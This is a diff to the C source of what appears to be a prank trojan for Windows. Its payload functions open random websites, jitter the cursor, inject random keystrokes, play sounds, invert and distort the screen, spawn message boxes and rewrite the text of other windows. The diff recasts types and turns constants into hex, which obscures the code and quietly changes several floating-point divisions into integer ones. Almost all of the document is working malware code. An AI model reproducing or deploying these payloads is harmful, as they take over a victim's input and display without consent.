@@ -34,37 +34,37 @@ PAYLOAD Payloads[] = {
 };
 const size_t nPayloads = sizeof(Payloads) / sizeof(PAYLOAD);
 
-int PayloadExecute(PAYLOADFUNC) {
+INT PayloadExecute(PAYLOADFUNC) {
 	ShellExecute(NULL, L"open", Sites[Random() % nSites], NULL, NULL, SW_SHOWDEFAULT);
 
-	return 1500.0 / (Times / 15.0 + 1) + 100 + (Random() % 200);
+	return 0x5dc / (Times / 0xf + 0x1) + 0x64 + (Random() % 0xc8);
 }
 
-int PayloadCursor(PAYLOADFUNC) {
+INT PayloadCursor(PAYLOADFUNC) {
 	POINT Cursor;
 	GetCursorPos(&Cursor);
 
-	SetCursorPos(Cursor.x + (Random() % 3 - 1) * (Random() % (Runtime / 2200 + 2)), Cursor.y + (Random() % 3 - 1) * (Random() % (Runtime / 2200 + 2)));
+	SetCursorPos(Cursor.x + (Random() % 0x3 - 0x1) * (Random() % (Runtime / 0x898 + 0x2)), Cursor.y + (Random() % 0x3 - 0x1) * (Random() % (Runtime / 0x898 + 0x2)));
 
-	return 2;
+	return 0x2;
 }
 
-int PayloadKeyboard(PAYLOADFUNC) {
+INT PayloadKeyboard(PAYLOADFUNC) {
 	INPUT Input;
 
 	Input.type = INPUT_KEYBOARD;
 	Input.ki.wVk = (Random() % (0x5a - 0x30)) + 0x30;
 	SendInput(1, &Input, sizeof(INPUT));
 
-	return 300 + (Random() % 400);
+	return 0x12c + (Random() % 0x190);
 }
 
-int PayloadSound(PAYLOADFUNC) {
+INT PayloadSound(PAYLOADFUNC) {
 	PlaySound(Sounds[Random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
-	return 20 + (Random() % 20);
+	return 0x14 + (Random() % 0x14);
 }
 
-int PayloadBlink(PAYLOADFUNC) {
+INT PayloadBlink(PAYLOADFUNC) {
 	HWND hWnd = GetDesktopWindow();
 	HDC hDc = GetWindowDC(hWnd);
 	RECT rEkt;
@@ -72,18 +72,18 @@ int PayloadBlink(PAYLOADFUNC) {
 	BitBlt(hDc, 0, 0, rEkt.right - rEkt.left, rEkt.bottom - rEkt.top, hDc, 0, 0, NOTSRCCOPY);
 	ReleaseDC(hWnd, hDc);
 
-	return 100;
+	return 0x64;
 }
 
-int PayloadMessageBox(PAYLOADFUNC) {
-	CreateThread(NULL, 4096, &MessageBoxThread, NULL, NULL, NULL);
+INT PayloadMessageBox(PAYLOADFUNC) {
+	CreateThread(NULL, 0x1000, &MessageBoxThread, NULL, NULL, NULL);
 
-	return 2000.0 / (Times / 8.0 + 1) + 20 + (Random() % 30);
+	return 0x7d0 / (Times / 0x8 + 0x1) + 0x14 + (Random() % 0x1e);
 }
 
-int PayloadDrawErrors(PAYLOADFUNC) {
-	int ix = GetSystemMetrics(SM_CXICON) / 2;
-	int iy = GetSystemMetrics(SM_CYICON) / 2;
+INT PayloadDrawErrors(PAYLOADFUNC) {
+	int ix = GetSystemMetrics(SM_CXICON) / 0x2;
+	int iy = GetSystemMetrics(SM_CYICON) / 0x2;
 
 	HWND hWnd = GetDesktopWindow();
 	HDC hDc = GetWindowDC(hWnd);
@@ -93,47 +93,47 @@ int PayloadDrawErrors(PAYLOADFUNC) {
 
 	DrawIcon(hDc, Cursor.x - ix, Cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
 
-	if (Random() % (int)(10 / (Times / 500.0 + 1) + 1) == 0) {
+	if (Random() % (int)(0xa / (Times / 0x1f4 + 0x1) + 0x1) == 0) {
 		DrawIcon(hDc, Random() % scrw, Random() % scrh, LoadIcon(NULL, IDI_WARNING));
 	}
 
 	ReleaseDC(hWnd, hDc);
 
-	return 2;
+	return 0x2;
 }
 
-int PayloadChangeText(PAYLOADFUNC) {
+INT PayloadChangeText(PAYLOADFUNC) {
 	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
 
-	return 50;
+	return 0x32;
 }
 
-int PayloadPIP(PAYLOADFUNC) {
+INT PayloadPIP(PAYLOADFUNC) {
 	HWND hWnd = GetDesktopWindow();
 	HDC hDc = GetWindowDC(hWnd);
 	RECT rEkt;
 	GetWindowRect(hWnd, &rEkt);
-	StretchBlt(hDc, 50, 50, rEkt.right - 100, rEkt.bottom - 100, hDc, 0, 0, rEkt.right, rEkt.bottom, SRCCOPY);
+	StretchBlt(hDc, 0x32, 0x32, rEkt.right - 0x64, rEkt.bottom - 0x64, hDc, 0, 0, rEkt.right, rEkt.bottom, SRCCOPY);
 	ReleaseDC(hWnd, hDc);
 
-	return 200.0 / (Times / 5.0 + 1) + 4;
+	return 0xc8 / (Times / 0x5 + 0x1) + 0x4;
 }
 
-int PayloadPuzzle(PAYLOADFUNC) {
+INT PayloadPuzzle(PAYLOADFUNC) {
 	HWND hWnd = GetDesktopWindow();
 	HDC hDc = GetWindowDC(hWnd);
 	RECT rEkt;
 	GetWindowRect(hWnd, &rEkt);
 
-	int x1 = Random() % (rEkt.right - 100);
-	int y1 = Random() % (rEkt.bottom - 100);
-	int x2 = Random() % (rEkt.right - 100);
-	int y2 = Random() % (rEkt.bottom - 100);
-	int Width = Random() % 600;
-	int Height = Random() % 600;
+	int x1 = Random() % (rEkt.right - 0x64);
+	int y1 = Random() % (rEkt.bottom - 0x64);
+	int x2 = Random() % (rEkt.right - 0x64);
+	int y2 = Random() % (rEkt.bottom - 0x64);
+	int Width = Random() % 0x258;
+	int Height = Random() % 0x258;
 
 	BitBlt(hDc, x1, y1, Width, Height, hDc, x2, y2, SRCCOPY);
 	ReleaseDC(hWnd, hDc);
 
-	return 200.0 / (Times / 5.0 + 1) + 3;
+	return 0xc8 / (Times / 0x5 + 0x1) + 0x3;
 }
